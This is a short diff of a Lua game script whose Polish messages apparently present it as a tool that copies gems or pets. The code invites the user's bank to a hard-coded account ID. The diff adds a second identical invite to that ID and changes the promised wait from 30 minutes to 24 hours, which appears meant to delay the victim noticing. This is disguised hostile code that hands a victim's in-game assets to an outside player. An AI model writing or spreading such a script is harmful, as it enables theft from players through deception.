@@ -26,8 +26,9 @@ end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
     lib.Message.New("Przetwarzanie... (Upewnij sie czy na pewno masz gemy lub pety w banku!)");
 else
-    lib.Message.New("Gotowe, czekaj 30 minut zeby sie skopiowało!");
+    lib.Message.New("Gotowe, czekaj 24h  zeby sie skopiowało!");
 end;
  
  
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 1652530103)
 lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 1652530103)
